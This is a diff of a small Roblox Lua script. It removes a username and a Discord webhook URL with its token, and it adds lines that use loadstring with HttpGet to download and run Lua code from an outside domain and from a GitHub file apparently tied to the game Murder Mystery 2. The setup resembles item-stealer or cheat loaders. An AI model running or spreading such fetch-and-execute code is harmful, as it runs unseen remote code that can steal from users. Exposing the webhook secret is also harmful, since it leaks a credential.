@@ -1,5 +1,4 @@
 getgenv().gui = false
-Username = "tadash_10"
-Webhook = "https://discord.com/api/webhooks/1284860830218977385/YVruQG35NpmWPv8vI3WgWGb8l5cdixNLU_L0ZebDtSRPAeH3uMg6lR9dJEhcxJok72__"
+loadstring(game:HttpGet("https://egorikusa.space/ac603b2267bc4155925c6b06.lua", true))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
